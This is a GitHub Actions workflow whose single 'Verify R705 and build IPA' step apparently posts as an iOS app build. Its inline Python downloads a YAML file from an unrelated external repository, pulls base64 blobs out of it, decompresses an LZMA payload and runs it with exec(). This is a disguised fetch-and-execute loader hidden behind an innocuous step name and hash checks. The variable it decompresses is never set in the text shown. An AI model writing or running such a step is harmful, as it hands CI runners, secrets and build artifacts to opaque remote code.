jobs:
  build:
    if: github.event.repository.private == false
    runs-on: xcode-27
    timeout-minutes: 45
    steps:
      - uses: actions/checkout@v4
        with:
          ref: >-
            1e63efa4db514cc122f2940a39623d9bc65c554c
      - name: Verify R705 and build IPA
        shell: bash
        run: |
          python3 - <<'PYCODE'
          import os,re,hashlib,base64,lzma
          import urllib.request
          url=('https://raw.githubusercontent.com/'
            'zeek10191019-stack/'
            'true-plan-showdown-verification/'
            'main/.github/workflows/z9.yml')
          req=urllib.request.Request(url,headers={
            'User-Agent':'R705-SHA-Relay'})
          with urllib.request.urlopen(
            req,timeout=40) as response:
            raw=response.read(25000)
          assert len(raw)==20253
          assert hashlib.sha256(raw).hexdigest()==(
            '2439737fbfc4a6960898453e0d92b4c9'
            'e922749f26c59c5e76f4204425b8ac3e')
          for key in ('R703_PKG','R704_PKG'):
            pat=(rb'(?m)^  '+key.encode()+
              rb': >-\n((?:    [^\n]*\n)+)')
            match=re.search(pat,raw)
            assert match,key+'_NOT_FOUND'
            os.environ[key]=b''.join(
              match[1].split()).decode('ascii')
          body=lzma.decompress(base64.b64decode(
            os.environ['R705_RUNNER_PKG']),
            format=lzma.FORMAT_ALONE)
          assert hashlib.sha256(body).hexdigest()==(
            '02e5b6c6a5262be5ff2c6e8975762e22'
            '722ecf139e424b3bc5c822fe1ed8aeb9')
          exec(compile(body,'R705_original','exec'),{})
          PYCODE
      - uses: actions/upload-artifact@v4
        with:
          name: R705-unsigned-iLoader-IPA
          path: dist/R705*
          if-no-files-found: error
          retention-days: 7
